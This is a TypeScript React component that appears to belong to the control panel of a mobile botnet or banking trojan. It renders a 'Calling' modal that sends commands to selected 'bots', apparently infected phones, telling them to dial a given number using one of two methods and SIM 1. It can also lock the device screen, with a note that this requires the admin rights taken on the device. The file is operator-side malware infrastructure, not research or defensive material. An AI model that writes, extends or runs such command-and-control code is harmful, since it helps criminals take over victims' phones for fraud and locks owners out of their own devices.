import React, {useEffect, useState} from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Alert, Button, Form, Input, Modal, Switch} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {inputRules} from "../../../Util/config";
import {useTranslation} from "react-i18next";

const Calling: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();
    const {t} = useTranslation();

    const [locked, setLocked] = useState(false);
    const [method, setMethod] = useState(1);

    useEffect(() => {
        form.setFieldsValue({
            sim: "sim1",
        });
    }, [form]);

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };
    const formSubmit = () => {
        const formFieldsValues = form.getFieldsValue();
        if (method === 1) {
            sendCommand({
                command: "calling",
                payload: {
                    ...formFieldsValues,
                    lock: formFieldsValues["lock"] === true ? 1 : 0,
                    // sim: formFieldsValues["sim"] ?? "sim1",
                },
                botIds: getBotsId(props.selectedBots),
            });
        } else {
            sendCommand({
                command: "makecall",
                payload: {
                    ...formFieldsValues,
                },
                botIds: getBotsId(props.selectedBots),
            });
        }

        closeModal();
    };

    return (
        <Modal
            title={t("CALLING_COMMAND")}
            open={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText={t("CALLING_COMMAND")}
            cancelText={t("MODAL_BUTTON_CANCEL")}
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item>
                    <Button
                        type={method === 1 ? "primary" : "default"}
                        onClick={() => setMethod(1)}
                        style={{marginRight: 15}}
                    >
                        {t("METHOD")} 1
                    </Button>
                    <Button
                        type={method === 2 ? "primary" : "default"}
                        onClick={() => setMethod(2)}
                    >
                        {t("METHOD")} 2
                    </Button>
                </Form.Item>
                <Form.Item
                    label={t("NUMBER")}
                    name="number"
                    rules={inputRules}
                >
                    <Input type="text" placeholder={t("NUMBER")} />
                </Form.Item>
                {method === 1 && props.selectedBots.length === 1 && (
                    <Form.Item label={t("LOCK_SCREEN") + "?"} name="lock" valuePropName="checked">
                        <Switch
                            unCheckedChildren={t("NO")}
                            checkedChildren={t("YES")}
                            checked={locked}
                            onClick={() => setLocked(!locked)}
                        />
                    </Form.Item>
                )}

                {locked && props.bot?.sub_info.admin &&
                    <Alert type="warning" message="Need activate admin rights to lock screen"/>
                }
            </Form>
        </Modal>
    );
};

export default Calling;
